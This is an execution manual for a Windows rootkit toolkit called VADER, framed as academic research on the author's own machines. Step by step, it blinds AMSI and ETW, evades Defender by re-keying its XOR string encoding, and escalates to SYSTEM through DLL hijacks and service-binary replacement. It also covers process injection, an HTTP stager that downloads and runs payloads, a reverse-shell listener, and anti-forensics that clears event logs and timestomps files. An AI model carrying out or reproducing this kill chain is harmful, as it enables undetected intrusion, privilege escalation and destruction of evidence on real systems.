# VADER ROOTKIT — EXECUTION MANUAL

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY
## Operator: VADER (george wu / 22DIV)
## Authorisation: Own hardware only. CSEC academic research.

---

## Purpose

This is the step-by-step execution guide. Not theory. Not history. You follow this from top to bottom and you get a working kill chain on your own machine.

The OPERATIONS_MANUAL.md is the vector-by-vector reference. This document is the "do this, then this, then this" walkthrough that ties them together.

---

## Table of Contents

1. [Pre-Flight Checklist](#1-pre-flight-checklist)
2. [Quick Start (deploy.py)](#2-quick-start-deploypy)
3. [Manual Execution: Full Kill Chain](#3-manual-execution-full-kill-chain)
4. [Phase 0: C2 Listener](#phase-0-c2-listener)
5. [Phase 1+2: Dark Room](#phase-12-dark-room-amsietw-bypass)
6. [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
7. [Phase 4: Process Injection](#phase-4-process-injection-hotel)
8. [Phase 5: HTTP Stager](#phase-5-http-stager-india)
9. [Phase 6: Anti-Forensics Cleanup](#phase-6-anti-forensics-cleanup-juliet)
10. [Verification Checklist](#4-verification-checklist)
11. [Troubleshooting](#5-troubleshooting)
12. [Cleanup](#6-cleanup)
13. [Setting Up a New Target Machine](#7-setting-up-a-new-target-machine)

---

## 1. Pre-Flight Checklist

Run every check before you start. If any fails, fix it before proceeding.

### 1.1 Compiler Available

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe 2>&1 | findstr "Version"
```

**Expected:** Prints MSVC version string.
**If missing:** Install Visual Studio 18 Community with "Desktop development with C++" workload.

### 1.2 Python Available

```cmd
python --version
```

**Expected:** Python 3.x.
**If missing:** Install from python.org, add to PATH.

### 1.3 Defender Running

```cmd
sc query WinDefend
```

**Expected:** `STATE: 4 RUNNING`
**If not running:** We fight the live system. If Defender isn't running, the test proves nothing. Enable it: Windows Security > Virus & threat protection > Real-time protection ON.

### 1.4 User Context

```cmd
whoami
whoami /groups | findstr "S-1-5-32-544"
```

**Expected:** Your username, and the findstr returns NOTHING (you are NOT in the Administrators group).
**Why:** The entire privesc chain assumes standard user. If you're already admin, the escalation is meaningless.

### 1.5 Detection Status

```cmd
python tests\scan_all.py
```

**Expected:** All binaries CLEAN.
**If ANY show DETECTED:** Stop. Do not proceed. See [Troubleshooting: Component Detected](#component-detected).

---

## 2. Quick Start (deploy.py)

The `deploy.py` script automates the kill chain. Use it when you know what you're doing and want speed.

```cmd
:: Check what's available
python deploy.py --help

:: Recon only (identify targets on this machine)
python deploy.py --recon

:: Check all binaries against current Defender
python deploy.py --status

:: Deploy V7 GOLF (phantom DLL — recommended first vector)
python deploy.py --deploy V7

:: Full chain: status check + dark room + V7 + shell setup
python deploy.py --chain V7

:: Start C2 listener on port 4444
python deploy.py --listen

:: Start C2 listener on custom port
python deploy.py --listen 9999

:: Check if a vector fired (look for canary file)
python deploy.py --canary V7

:: FULL AUTOMATION: compile → scan → recon → dark room → auto-select → deploy → monitor → evidence
python deploy.py --pentest

:: Full automation with RADON target profile
python deploy.py --pentest --profile radon

:: Dry run — show what would happen without executing
python deploy.py --pentest --dry-run

:: Skip recon (already ran vader_recon.ps1 manually)
python deploy.py --pentest --skip-recon

:: Compile all components only
python deploy.py --compile

:: Build shell with baked-in C2 address
python deploy.py --compile-shell 192.168.1.100 4444
```

### deploy.py Decision Tree

```
Want to know what's vulnerable?    → --recon
Want to check evasion status?      → --status
Want to deploy one vector?         → --deploy V7
Want the full automated chain?     → --chain V7
Want to catch the callback?        → --listen
Want to verify a vector fired?     → --canary V7
Want full pentest automation?      → --pentest
Want to target RADON laptop?       → --pentest --profile radon
Want to see the plan without exec? → --pentest --dry-run
Just need to compile?              → --compile
```

### --pentest Mode (Full Automation)

The `--pentest` flag runs the entire kill chain automatically:

```
1. Compile all components (dark_room, vectors, shell)
2. Scan all binaries against current Defender sigs
3. Run vader_recon.ps1 (20-section scan)
4. Parse recon output and score vectors
5. Auto-select best vector (profile-aware)
6. Run dark room (AMSI+ETW bypass)
7. Deploy selected vector
8. Monitor canary file for SYSTEM execution proof
9. Collect evidence (JSON report + canary + deploy log)
10. Start C2 listener
```

**Target Profiles:**
- `--profile local` — No restrictions. Scores all vectors equally.
- `--profile radon` — RADON laptop constraints: excludes V4 (no Wondershare), prefers V7 > V6. V7 gets +20 preference bonus.

**Flags:**
- `--dry-run` — Shows what would happen without executing anything
- `--skip-compile` — Skip compilation (binaries already built)
- `--skip-recon` — Skip recon (already ran vader_recon.ps1 manually)
- `--canary-timeout N` — Seconds to wait for canary file (default: 120)

---

## 3. Manual Execution: Full Kill Chain

When you want to understand every step. Follow in order.

```
KILL CHAIN FLOW:
  [Recon] → [Scan] → [Build] → [C2 Listener] → [Dark Room] → [Privesc] → [Verify]
```

### Recon

Run the recon script on the target machine first. This identifies what's available.

```powershell
powershell -ep bypass .\recon\vader_recon.ps1
```

This runs a 20-section scan and reports:
- System info, user context, Defender status (Sections 1-4)
- Services, writable binaries, PATH dirs (Sections 5-9)
- Installed software, scheduled tasks, manifests (Sections 10-12)
- AMSI/ETW providers, writable system dirs (Sections 13-15)
- Interesting files, shares, remote access (Sections 16-17)
- Privesc quick checks: AlwaysInstallElevated, AppInit_DLLs, IFEO, print monitors, LSA, WMI, token privs, named pipes (Section 18)
- **Phantom DLL hunting**: PE import parser scans all SYSTEM service binaries for DLLs that don't exist on disk (Section 19)
- **Vector assessment**: Auto-scores V4/V6/V7/Dark Room and recommends attack path (Section 20)

Read the output. It tells you which vectors are viable on this specific machine.
See SCANNER_MANUAL.md for detailed section-by-section documentation.

---

### Phase 0: C2 Listener

Start the listener FIRST. It needs to be waiting when the privesc payload calls back.

```cmd
:: Option A: Python listener (recommended)
python shell\vader_listener.py 4444

:: Option B: ncat fallback
ncat -lvp 4444
```

**Expected:** Listener reports waiting on port 4444.
**Leave this running.** Open a second terminal for the rest.

### Phase 1+2: Dark Room (AMSI+ETW Bypass)

The dark room blinds both AMSI (script scanning) and ETW (telemetry) simultaneously using hardware breakpoints. Zero memory modification.

#### Build

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe dark_room\dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-
```

**Expected:** `dark_room.exe` appears in repo root. No warnings required.

#### Test (verify bypass works without deploying)

```cmd
dark_room.exe --test
```

**Expected output:**
```
[*] VADER DARK ROOM — AMSI + ETW Hardware Breakpoint Bypass
[+] AmsiScanBuffer: 0x00007FFxxxxxxxx
[+] EtwEventWrite:  0x00007FFxxxxxxxx
[+] VEH installed
[+] DR0 set → AmsiScanBuffer
[+] DR1 set → EtwEventWrite
[+] AMSI: BLIND
[+] ETW: BLIND
```

**If `AMSI: BLIND` does not appear:** See [Troubleshooting: Dark Room Fails](#dark-room-fails).

#### Deploy (activate bypass + spawn shell)

```cmd
dark_room.exe
```

This sets the hardware breakpoints and spawns a new PowerShell session. Inside that PowerShell, AMSI and ETW are blind. Any scripts you run will not be scanned or reported.

**Test it inside the spawned PowerShell:**

```powershell
# This string normally triggers Defender:
"Invoke-Mimikatz"
# If AMSI is blind, no alert. If AMSI is active, Defender blocks it.
```

#### Critical Limitation

Hardware breakpoints are **per-process**. The spawned PowerShell inherits the blind state, but any NEW process you launch from it (e.g., `Start-Process`) does NOT. This is why Phase 4 (injection) exists — to propagate the breakpoints into other processes.

---

### Phase 3: Privilege Escalation

Choose your vector based on recon results.

#### Decision Tree: Which Vector?

```
Is Microsoft Office installed?
├── YES → V7 GOLF (phantom DLL)          ← RECOMMENDED. First-party. Auto-trigger.
│         Office ClickToRunSvc loads osppc.dll from PATH.
│         osppc.dll doesn't exist. You fill the void.
│
└── NO  → Is Wondershare installed?
          ├── YES → V4 DELTA (service replace)
          │         NativePushService has insecure ACLs.
          │         Replace the binary. Wait for restart.
          │
          └── NO  → V6 FOXTROT (generic PATH plant)
                    Requires recon to find a DLL gap.
                    Run vader_recon.ps1 and check output.
```

#### V7 GOLF — Phantom DLL (Recommended)

**Why V7:** First-party Microsoft service. Always running. Auto-restarts daily. User-writable PATH directory. No admin required at any step.

**Build:**

```cmd
cl.exe vectors\v7_phantom_dll\phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**Expected:** `osppc.dll` appears. This is your payload DLL.

**Deploy:**

```cmd
:: Create the target directory if it doesn't exist
mkdir "%USERPROFILE%\.local\bin" 2>nul

:: Plant the DLL
copy osppc.dll "%USERPROFILE%\.local\bin\osppc.dll"

:: Verify it's in place
dir "%USERPROFILE%\.local\bin\osppc.dll"
```

**Trigger (pick one):**

```cmd
:: Option A: Force trigger (immediate)
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"

:: Option B: Launch any Office app (Word, Excel, etc.)
:: Option C: Wait — ClickToRunSvc restarts daily
```

**Verify:**

```cmd
type C:\Windows\Temp\osp_telemetry.log
```

**Expected output:**
```
2026-06-17T10:30:00|SYSTEM|elev=1|pid=1234|PHANTOM_OSPPC|C:\Program Files\...\OfficeClickToRun.exe
```

If you see `SYSTEM` and `elev=1` — you have SYSTEM-level code execution from a standard user account.

#### V4 DELTA — Service Binary Replacement

**Prerequisites:** Wondershare NativePushService installed with insecure ACLs (check with recon).

**Build:**

```cmd
cl.exe vectors\v4_svc_replace\svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**Note:** The `/link advapi32.lib user32.lib` is required — these DLLs use `OpenProcessToken`, `GetTokenInformation`, `GetUserNameA`, and `wsprintfA` which live in advapi32 and user32.
```

**Deploy:**

```cmd
:: Step 1: Rename the real binary (Windows allows renaming running executables)
ren "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe" WsNativePushService_real.exe

:: Step 2: Plant the replacement
copy WsNativePushService.exe "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"
```

**Trigger:**

```cmd
:: Reboot triggers the service restart
shutdown /r /t 60
:: Or wait for the service to restart on its own
```

**Verify after reboot:**

```cmd
type C:\Windows\Temp\svc_health.log
```

**Expected:** `SYSTEM|elev=1|pid=XXXX|DELTA_REPLACE`

#### V6 FOXTROT — Generic PATH Plant

V6 is the fallback. It requires a DLL gap found by recon — there's no universal target like V7's osppc.dll.

```cmd
:: Build with the target DLL name from recon
cl.exe vectors\v6_path_hijack\path_hijack_dll_annotated.c /Fe:TARGET_NAME.dll /LD /O1 /utf-8 /link advapi32.lib user32.lib

:: Deploy
copy TARGET_NAME.dll "%USERPROFILE%\.local\bin\"
```

**Trigger:** Whatever causes the target service to load that DLL (reboot, service restart, etc.).

**Verify:**

```cmd
type C:\Windows\Temp\hwmon_diag.log
```

---

### Phase 4: Process Injection (HOTEL)

Injects the dark room's HWBP bypass into any target process. Two modes: inject into a running process or spawn a new process pre-blinded.

#### Build

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"

:: DLL payload
cl.exe injection\vader_inject_dll_annotated.c /Fe:injection\vader_inject.dll /LD /O1 /GS- /utf-8

:: Injector EXE
cl.exe injection\vader_inject_annotated.c /Fe:injection\vader_inject.exe /O1 /GS- /utf-8
```

**Expected:** `vader_inject.dll` (105KB) and `vader_inject.exe` (149KB) in `injection/`. No link libraries needed — everything resolves from kernel32.lib.

#### Deploy — Running Process

```cmd
:: Find target PID
tasklist | findstr powershell

:: Inject
injection\vader_inject.exe <PID>
```

**Expected output:**
```
[*] VADER Phase 4 — Process Injection
[*] Target PID: <PID>
[+] Remote memory allocated
[+] DLL path written to target
[+] LoadLibrary thread created — waiting...
[+] DLL loaded at remote base: 0x00007FFxxxxxxxxx
[+] VdrWatch thread started in target
[*] Injection complete — target is blind
```

#### Deploy — Spawn Blind Process

```cmd
injection\vader_inject.exe --spawn
```

**Expected output:**
```
[*] VADER Phase 4 — Process Injection (SPAWN mode)
[+] Process created SUSPENDED: PID <PID>
[+] DLL injected into suspended process
[+] VdrWatch started
[+] Main thread resumed — process is now running BLIND
```

This spawns a new PowerShell with CREATE_SUSPENDED. The AMSI/ETW bypass is active before the process executes its first instruction. AMSI never gets a chance to initialise in a monitored state.

#### Verify

```cmd
:: Check canary file
type C:\Windows\Temp\inject_status.log

:: Expected:
:: [HOTEL] DllMain AMSI blind | pid=<PID>
:: [HOTEL] DllMain ETW  blind | pid=<PID>
:: [HOTEL] VdrWatch alive | pid=<PID> | tick=1
```

#### Test AMSI is actually blind

Inside the injected PowerShell, run a string that AMSI would normally flag:
```powershell
"Invoke-Mimikatz"
```
If AMSI is blind: no alert. If active: Defender blocks it.

#### Critical Notes

- **VdrWatch** runs as a persistent thread in the target, re-blinding new threads every 2 seconds. If the target spawns worker threads after injection, they'll be caught on the next VdrWatch cycle.
- **AMSI delayed load**: If amsi.dll isn't loaded at injection time (rare for PowerShell, common for other processes), VdrWatch retries resolution every 2 seconds and re-blinds all threads when AMSI becomes available.
- The DLL and EXE must be in the same directory. The EXE locates the DLL relative to its own path.

---

### Phase 5: HTTP Stager (INDIA)

Optional — use when you want to deliver payloads over HTTP instead of direct file copy.

#### Start C2 Server (attacker machine)

```cmd
python stagers\vader_serve.py 8080
```

Endpoints:
- `GET /dark_room` → `dark_room/dark_room.exe`
- `GET /inject_dll` → `injection/vader_inject.dll`
- `GET /inject_exe` → `injection/vader_inject.exe`
- `GET /shell` → `shell/vader_shell.exe`

#### Compile Stager

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe stagers\http_stager_annotated.c /Fe:stagers\vader_stager.exe /O1 /GS- /utf-8 /link winhttp.lib advapi32.lib
```

#### Execute on Target

```cmd
:: Download + execute dark_room.exe
stagers\vader_stager.exe

:: Download + verify only (no execution)
stagers\vader_stager.exe --test

:: Also download injection tools
stagers\vader_stager.exe --inject
```

**Expected output:**
```
[*] VADER HTTP Stager (INDIA)
[*] C2: 127.0.0.1:8080
[+] Downloaded dark_room.exe (XX KB)
[+] Payload executed successfully
```

**Evidence:** Canary at `C:\Windows\Temp\vader_stager_canary.txt` tagged `[INDIA]`

---

### Phase 6: Anti-Forensics Cleanup (JULIET)

Run AFTER the operation is complete and evidence has been collected.

#### Compile

```cmd
cl.exe forensics\vader_clean_annotated.c /Fe:forensics\vader_clean.exe /O1 /GS- /utf-8 /link advapi32.lib
```

#### Execute

```cmd
:: Preview what would be cleaned (safe — changes nothing)
forensics\vader_clean.exe --dry-run

:: Clean all canaries + event logs + prefetch
forensics\vader_clean.exe

:: Clean everything AND schedule self-deletion on next reboot
forensics\vader_clean.exe --self

:: Timestomp a specific file
forensics\vader_clean.exe --timestomp C:\path\to\file.exe
```

**Expected output:**
```
[*] VADER Anti-Forensics (JULIET)
[+] Deleted: svc_health.log
[+] Deleted: inject_status.log
[+] Deleted: vader_stager_canary.txt
[+] Cleared: PowerShell Operational log
[+] Cleared: Security log
[+] Cleaned: N prefetch files
[+] Self-delete scheduled for next reboot
```

**What it cleans:**
- All V4-V7 canary files
- Injection status log
- Stager canary
- Its own evidence log
- PowerShell Operational event log
- Security event log
- Prefetch files matching VADER binary names

---

## 4. Verification Checklist

After running the kill chain, verify each phase succeeded:

```
[ ] Pre-flight: All binaries CLEAN (scan_all.py)
[ ] Dark room: --test shows AMSI: BLIND and ETW: BLIND
[ ] Injection: Canary shows [HOTEL] DllMain AMSI+ETW blind (if using Phase 4)
[ ] Stager: Canary shows [INDIA] with payload path (if using Phase 5)
[ ] Privesc: Canary file exists and contains SYSTEM + elev=1
[ ] C2 (if using shell): Listener received callback
[ ] Forensics: --dry-run shows all targets found (if using Phase 6)
[ ] Evidence: Screenshots, canary contents, whoami /all saved
```

### Evidence Collection

For every successful run, collect:

```cmd
:: 1. Canary content
type C:\Windows\Temp\<canary_file>.log > evidence\canary_%date%.txt

:: 2. Privilege confirmation (from SYSTEM context if shell achieved)
whoami /all > evidence\whoami_%date%.txt

:: 3. Process context
tasklist /v /fi "pid eq <canary_pid>" > evidence\process_%date%.txt

:: 4. Screenshot of services.msc showing the hijacked service
:: (manual — use Snipping Tool or Win+Shift+S)
```

---

## 5. Troubleshooting

### Component Detected

**Symptom:** `scan_all.py` reports a binary as DETECTED.
**Cause:** Defender updated its signatures and now recognises the binary.
**Fix:**
1. Identify which binary was caught
2. Check the vector — what XOR key does it use? (see OPERATIONS_MANUAL.md → Vector Index)
3. Generate new XOR-encoded strings with a different key:
   ```python
   key = 0xAA  # new key — pick any byte except 0x00
   s = "your string here"
   print(", ".join(f"0x{b ^ key:02X}" for b in s.encode()))
   ```
4. Replace the encoded arrays in the source file
5. Update the XOR key constant in the source
6. Recompile
7. Re-scan: `python tests\scan_all.py`
8. If STILL detected → deeper mutation needed (variable names, function order, code flow). See LEARNING_MANUAL.md Chapter 2.

### Dark Room Fails

**Symptom:** `dark_room.exe --test` does not show `AMSI: BLIND`.

**Check 1: Are addresses resolved?**
The output should show non-zero addresses for AmsiScanBuffer and EtwEventWrite. If they're 0x0:
- amsi.dll may not be loaded. Run from a context where AMSI is active (e.g., PowerShell).
- EtwEventWrite is in ntdll.dll — should always be available.

**Check 2: Is a debugger attached?**
Hardware breakpoints conflict with debuggers. If you have x64dbg/WinDbg attached, detach first.

**Check 3: Are debug registers already in use?**
Another security tool may be using DR0-DR3. Check:
```cmd
:: From PowerShell (elevated not required):
dark_room.exe --check
```
If DR0 or DR1 are already set, something else claimed them. This is rare on consumer Windows.

**Check 4: Is VEH installed?**
If the breakpoint fires but no handler catches it, the process crashes (STATUS_SINGLE_STEP exception). The `--test` flag handles this, but if you're modifying the code, ensure AddVectoredExceptionHandler is called BEFORE setting DR0/DR1.

### Canary File Not Created

**Symptom:** After triggering a vector, the canary file doesn't appear.

**Check 1: Did the trigger actually fire?**
- V7: Check if ClickToRunSvc restarted: `sc query ClickToRunSvc`
- V4: Check if the service restarted: `sc query WsNativePushService`
- V6: Check if the target service ran

**Check 2: Is the DLL/EXE in the right path?**
```cmd
:: V7
dir "%USERPROFILE%\.local\bin\osppc.dll"

:: V4
dir "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"
```

**Check 3: Is PATH configured?**
For V6/V7, the user's `.local\bin` must be in the machine PATH (not just user PATH for SYSTEM services).
```cmd
echo %PATH% | findstr ".local\bin"
```

**Check 4: File permissions?**
```cmd
icacls C:\Windows\Temp
```
SYSTEM should have write access to `C:\Windows\Temp`. If this is locked down (non-default), the canary write fails but the payload still executed — you just can't see the evidence.

### C2 Listener: No Callback

**Symptom:** Shell vector deployed but no reverse shell connection.

**Check 1: Is the listener running?**
```cmd
netstat -an | findstr "4444"
```
Should show LISTENING on 0.0.0.0:4444 or your IP.

**Check 2: Firewall?**
Windows Firewall may block inbound connections.
```cmd
:: Check if the port is allowed
netsh advfirewall firewall show rule name=all | findstr "4444"
```

**Check 3: Is the IP correct in the payload?**
The shell binary has a hardcoded C2 IP/port. If you compiled with the wrong IP, it's connecting to nowhere.
Verify by checking the source or decompiling.

**Check 4: Is Defender blocking the shell itself?**
Run `scan_all.py` and check if vader_shell.exe is CLEAN. If it's DETECTED, the shell got signatured — rebuild with new XOR key.

### Compile Errors

**`cl.exe is not recognized`:** Run vcvars64.bat first.

**`cannot open source file`:** Check the path. Are you in the repo root?

**`unresolved external symbol __imp_OpenProcessToken` / `__imp_GetTokenInformation`:** Missing `advapi32.lib`. These functions live in advapi32.dll. Add `/link advapi32.lib` to your cl.exe command. All privesc DLLs (V4, V6, V7) need this.

**`unresolved external symbol __imp_GetUserNameA` / `__imp_wsprintfA`:** Missing `user32.lib`. Add `/link user32.lib`. All privesc components need both `advapi32.lib user32.lib`.

**`unresolved external symbol __builtin_memcpy`:** GCC-specific intrinsic used in V6 source. MSVC doesn't support `__builtin_memcpy`. Fix: add `#include <string.h>` and change `__builtin_memcpy(...)` to `memcpy(...)`. This was fixed in the V6 source as of the current version.

**`/GS- warning`:** This is expected. We disable stack cookies intentionally for size optimisation. Note: V6 FOXTROT no longer uses `/GS-` (removed to avoid issues with string.h dependency).

**DLL builds produce .obj but no .dll:** Linker runs but silently fails to produce the DLL. This happens when `/link` libraries are missing — the linker can't resolve the imports. Check for unresolved external symbol warnings in the output.

### deploy.py Errors

**`UnicodeEncodeError: 'charmap' codec can't encode`:** PowerShell's default encoding (cp1252) can't handle box-drawing characters in deploy.py's output. Fixed in current version with `sys.stdout.reconfigure(encoding="utf-8", errors="replace")` at the top of deploy.py. If you see this on a fresh clone, ensure you have the latest deploy.py.

**`--compile` reports 3/5 success:** V6 and V7 were missing link libraries. Fixed in current VECTORS dict — both now include `"link_libs": "advapi32.lib user32.lib"`. All 5 components (dark_room, V4, V6, V7, shell) should compile 5/5.

**Scanner writable PATH false negative:** The ACL-based `Test-Writable` function misses user-owned directories (checks group SIDs but not personal SIDs). Fixed with `Test-WritablePractical` fallback that attempts actual file creation. If phantom DLLs show "Plantable: False" but the directory is clearly yours, this fix is missing — update vader_recon.ps1.

---

## 6. Cleanup

After testing, remove all evidence:

```cmd
:: Remove deployed DLLs
del "%USERPROFILE%\.local\bin\osppc.dll" 2>nul
del "%USERPROFILE%\.local\bin\*.dll" 2>nul

:: Remove canary files (or use vader_clean.exe to do this automatically)
del C:\Windows\Temp\osp_telemetry.log 2>nul
del C:\Windows\Temp\svc_health.log 2>nul
del C:\Windows\Temp\hwmon_diag.log 2>nul
del C:\Windows\Temp\ver_cache.log 2>nul
del C:\Windows\Temp\inject_status.log 2>nul
del C:\Windows\Temp\vader_stager_canary.txt 2>nul
del C:\Windows\Temp\vader_clean_log.txt 2>nul

:: Restore V4 original (if used)
:: ren "...\WsNativePushService_real.exe" WsNativePushService.exe

:: Remove compiled binaries from repo root
del dark_room.exe 2>nul
del osppc.dll 2>nul
del *.exe 2>nul
del *.dll 2>nul
del *.obj 2>nul
```

---

## 7. Setting Up a New Target Machine

When you get a new machine (RADON laptop, test rig, etc.):

### Step 1: Baseline the Machine

```cmd
:: What OS version?
ver
systeminfo | findstr /i "OS"

:: What's Defender's version?
powershell -c "Get-MpComputerStatus | Select-Object AMProductVersion, AntivirusSignatureVersion, AntivirusSignatureLastUpdated"

:: What's the user context?
whoami /all
```

### Step 2: Clone the Repo

```cmd
git clone https://github.com/rainfantry/vader-rootkit.git
cd vader-rootkit
```

### Step 3: Install Compiler

Install Visual Studio Community with "Desktop development with C++" workload. Verify:

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe
```

### Step 4: Run Pre-Flight

Follow Section 1 of this manual from the top.

### Step 5: Run Recon

```cmd
python deploy.py --recon
```

This tells you which vectors are viable on this specific machine. Not every machine has Wondershare (V4) or Office (V7).

### Step 6: Adapt and Execute

Based on recon results, choose your vector and follow the Phase 3 instructions above.

### Step 7: Document

Log every test run in ENGAGEMENT_LOG.md with:
- Date, target machine, OS build
- Vector used
- Defender version at time of test
- Result (canary content, screenshots)
- Any detections or failures

---

## Appendix A: File Reference

| File | Purpose |
|------|---------|
| `deploy.py` | Automated kill chain orchestrator |
| `tests/scan_all.py` | Detection status scanner (copies to temp, scans, reports) |
| `dark_room/dark_room_annotated.c` | Combined AMSI+ETW HWBP bypass |
| `shell/vader_shell_annotated.c` | XOR-obfuscated reverse shell |
| `shell/vader_listener.py` | C2 listener + payload configurator |
| `recon/vader_recon.ps1` | 20-section target reconnaissance (PE parser + phantom DLL hunting) |
| `SCANNER_MANUAL.md` | Scanner user manual — section-by-section documentation |
| `vectors/v4_svc_replace/svc_replace_annotated.c` | Service binary replacement |
| `vectors/v5_dll_proxy/version_proxy_annotated.c` | VERSION.dll proxy sideload |
| `vectors/v6_path_hijack/path_hijack_dll_annotated.c` | Generic PATH DLL plant |
| `vectors/v7_phantom_dll/phantom_dll_annotated.c` | Phantom DLL (osppc.dll / ClickToRunSvc) |
| `injection/vader_inject_dll_annotated.c` | Phase 4 injection DLL payload (HWBP + VEH + VdrWatch) |
| `injection/vader_inject_annotated.c` | Phase 4 injector EXE (PID inject + CREATE_SUSPENDED spawn) |
| `PHASE4_INVESTIGATION.md` | Phase 4 investigative report — architecture, evidence, evasion analysis |
| `OPERATIONS_MANUAL.md` | Vector-by-vector reference |
| `FINDINGS.md` | Findings #31-#53 |
| `ENGAGEMENT_LOG.md` | 14 engagements documented |

## Appendix B: XOR Key Quick Reference

| Vector | Current Key | Canary Path |
|--------|------------|-------------|
| V1-V3 (Evasion) | 0x41 | N/A (process-local) |
| V4 DELTA | 0x52 | `C:\Windows\Temp\svc_health.log` |
| V5 ECHO | 0x37 | `C:\Windows\Temp\ver_cache.log` |
| V6 FOXTROT | 0x63 | `C:\Windows\Temp\hwmon_diag.log` |
| V7 GOLF | 0x19 | `C:\Windows\Temp\osp_telemetry.log` |
| Phase 4 HOTEL | 0x77 | `C:\Windows\Temp\inject_status.log` |

When rotating a key, pick ANY byte 0x01-0xFF except the current key. Generate new encoded strings:

```python
key = 0xNN  # your new key
for s in ["string1", "string2", ...]:
    encoded = ", ".join(f"0x{b ^ key:02X}" for b in s.encode())
    print(f'// "{s}"')
    print(f"unsigned char enc[] = {{{encoded}, 0x{0 ^ key:02X}}};")
```

---

*VADER ROOTKIT — 22DIV / george wu*
*CSEC Tactical Cyber Operations*
